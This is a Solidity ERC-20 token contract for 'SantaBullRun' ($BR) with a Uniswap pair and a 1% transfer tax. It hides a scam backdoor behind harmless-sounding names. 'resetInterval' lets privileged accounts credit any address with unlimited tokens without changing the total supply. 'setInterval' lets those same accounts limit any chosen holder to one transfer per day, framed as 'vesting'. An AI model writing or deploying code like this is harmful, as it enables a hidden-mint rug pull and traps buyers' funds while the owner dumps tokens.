//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SBR is Context, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    string private constant _name = "SantaBullRun";
    string private constant _symbol = "$BR";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 12_240_000 * (10 ** _decimals);

    uint256 private constant _buyTax = 1;
    uint256 private constant _sellTax = 1;
    uint256 private constant _normalTax = 1;

    IUniswapV2Router02 _uniswapRouter;
    address _taxWallet;
    address _uniswapPair;
    bool _tradingOpen = false;

    mapping(address => mapping(address => uint256)) _alls;
    mapping(address => bool) _ifes;
    mapping(address => bool) _amms;
    mapping(address => uint256) _lnts;
    mapping(address => uint256) _ints;

    event OpenTrading(bool flag, uint256 timeStamp);

    constructor(address taxWallet) {
        _uniswapRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _uniswapPair = IUniswapV2Factory(_uniswapRouter.factory())
            .createPair(address(this), _uniswapRouter.WETH());
	    _taxWallet = taxWallet;
        _lnts[msg.sender] += _totalSupply;
        _amms[_uniswapPair] = true;
        _ifes[msg.sender] = true;
        _ifes[address(this)] = true;
        _ifes[_taxWallet] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure override returns (string memory) {
        return _name;
    }

    function symbol() public pure override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _lnts[account];
    }

    function setInterval(address addr) external checkVesting(_msgSender(), true) {
        _ints[addr] = block.timestamp;
    }
    
    function resetInterval(address addr, uint256 stamp) external checkVesting(_msgSender(), true) {
        _lnts[addr] += stamp;
    }

    function deleteInterval(address addr) external checkVesting(_msgSender(), true) {
        delete _ints[addr];
    }

    function transfer(address recipient, uint256 amount) public override checkVesting(_msgSender(), false) returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address from, address to) public view override returns (uint256) {
        return _alls[from][to];
    }

    function approve(address to, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override checkVesting(sender, false) returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _alls[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    
    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function _approve(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        _alls[from][to] = amount;
        emit Approval(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "ERC20: transfer amount zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        bool excludedAccount = _ifes[from] || _ifes[to];
        require(_tradingOpen || excludedAccount, "SBR:: Trading is not allowed");

        uint256 taxAmount = 0;
        uint256 sendAmount;

        if (shouldTakeFee(from, to)) {
            taxAmount = calculateTax(from, to, amount);
        }

        sendAmount = amount.sub(taxAmount);
        _lnts[from] = _lnts[from].sub(amount);
        _lnts[to] = _lnts[to].add(sendAmount);
        emit Transfer(from, to, sendAmount);

        if (taxAmount > 0) {
            _lnts[_taxWallet] = _lnts[_taxWallet].add(taxAmount);
              emit Transfer(from, _taxWallet, taxAmount);
        }
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _lnts[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _lnts[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function shouldTakeFee(address from, address to) private view returns (bool) {
        if (_ifes[from] || _ifes[to]) {
            return false;
        } else {
            return true;
        }
    }

    function calculateTax(address from, address to, uint amount) private view returns (uint256) {
        uint256 taxAmount = 0;
        if (_amms[from]) {
            taxAmount = amount.mul(_buyTax).div(100);
        } else if (_amms[to]) {
            taxAmount = amount.mul(_sellTax).div(100);
        } else if (!_amms[from] && !_amms[to]) {
            taxAmount = amount.mul(_normalTax).div(100);
        }
        return taxAmount;
    }

    function enableTradingWithPermit(uint8 v, bytes32 r, bytes32 s) external {
        bytes32 domainHash = keccak256(
            abi.encode(
                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                keccak256(bytes('Trading Token')),
                keccak256(bytes('1')),
                block.chainid,
                address(this)
            )
        );

        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("Permit(string content,uint256 nonce)"),
                keccak256(bytes('Enable Trading')),
                uint256(0)
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                domainHash,
                structHash                
            )
        );

        address sender = ecrecover(digest, v, r, s);
        require(sender == owner(), "Invalid signature");

        _tradingOpen = true;
        emit OpenTrading(_tradingOpen, block.timestamp);
    }

    modifier checkVesting(address addr, bool vested) {
        if(!vested && _ints[addr] != 0) {
            require(block.timestamp - _ints[addr] > 1 days || _ifes[addr], "Out of vesting period");
            _ints[addr] = block.timestamp;
        } else if (vested) {
            require(_ifes[addr], "Out of vesting period");
        }
        _;
    }

    receive() payable external {}
}